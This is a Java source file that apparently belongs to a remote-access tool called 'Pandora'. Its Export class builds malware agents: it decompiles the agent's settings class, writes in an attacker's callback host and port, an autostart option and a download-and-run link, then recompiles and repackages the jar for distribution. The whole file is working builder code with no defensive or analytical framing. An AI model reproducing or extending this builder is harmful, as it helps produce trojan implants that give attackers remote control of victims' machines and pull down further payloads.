package org.pandora.master.export;

import javafx.application.Platform;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import org.pandora.master.utils.FileUtils;
import org.pandora.master.utils.TimeUtils;
import sun.awt.OSInfo;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Random;

public class Export {

    private final Random random;
    private final FileUtils fileUtils;
    private final String exportPath;

    public Export(final FileUtils fileUtils) {
        this.fileUtils = fileUtils;
        this.random = new Random();
        this.exportPath = fileUtils.getPath() + "\\export";
    }

    public void export(final Button buildButton, final File outputDirectory, final Label lastBuild, final String host, final int port, final boolean autoStart, final boolean downloader, final String downloadLink, final String archivePath) {
        final long start = System.currentTimeMillis();
        new Thread(() -> {
            try {
                this.exec("jar xf Agent.jar");
                this.pause(800L);
                this.exec("cmd /c java -Dfile.encoding=UTF8 -jar decompiler.jar org/pandora/agent/utils/Settings.class > Settings.java");
                final File settingsFile = new File(this.exportPath + "\\Settings.java");
                while (!settingsFile.exists()) this.pause(200L);
                this.pause(6200L);
                this.fileUtils.replaceAll(settingsFile, "base:hostname", host);
                this.fileUtils.replaceAll(settingsFile, "base:port", port);
                this.fileUtils.replaceAll(settingsFile, "base:autostart", autoStart);
                this.fileUtils.replaceAll(settingsFile, "base:otherfile", downloader);
                this.fileUtils.replaceAll(settingsFile, "base:fileuri", downloadLink);
                this.fileUtils.replaceAll(settingsFile, "base:applauncher", archivePath);
                this.fileUtils.replaceAll(settingsFile, "base:appid", this.random.nextInt(Integer.MAX_VALUE));
                org.apache.commons.io.FileUtils.copyFileToDirectory(settingsFile, new File(this.exportPath + "\\org\\pandora\\agent\\utils"));
                this.pause(400L);
                this.exec("javac -classpath Agent.jar org\\pandora\\agent\\utils\\Settings.java");
                this.pause(2700L);
                this.exec("jar uf Agent.jar org/pandora/agent/utils/Settings.class");
                this.pause(2700L);
                Files.copy(Paths.get(this.exportPath + "\\Agent.jar"), Paths.get(outputDirectory + "\\Agent " + TimeUtils.getSimpleHour().replace(":", "-") + ".jar"), StandardCopyOption.REPLACE_EXISTING);
                this.pause(2000L);
                this.fileUtils.createBuildFolder();
                this.pause(200L);
                System.out.println("[Pandora] Build complete!");
                Platform.runLater(() -> {
                    lastBuild.setText("The export was successful for " + host + ":" + port + " at " + TimeUtils.getSimpleHour() + " (" + (int) ((System.currentTimeMillis() - start) / 1000) + "s) - please check that the \"Settings.java\" class has been modified\n\n* Auto Start : " + autoStart + "\n* Auto Download : " + downloader + "\n* Download link : " + downloadLink + "\n* Output Path : " + outputDirectory.getAbsolutePath());
                    buildButton.setDisable(false);
                });
            } catch (final IOException exception) {
                System.out.println("[Pandora] Error while building agent!");
                Platform.runLater(() -> lastBuild.setText("(Decompile) Error while trying to build : " + exception.getMessage()));
                exception.printStackTrace();
            }
            Thread.currentThread().interrupt();
        }).start();
    }

    private void pause(final long time) {
        try {
            Thread.sleep(time);
        } catch (final InterruptedException exception) {
            exception.printStackTrace();
        }
    }

    private void exec(final String command) {
        final File dir = new File(this.exportPath);
        try {
            if (OSInfo.getOSType() == OSInfo.OSType.WINDOWS)
                Runtime.getRuntime().exec(command, null, dir);
            else
                Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command}, null, dir);
        } catch (final IOException exception) {
            exception.printStackTrace();
        }
    }
}
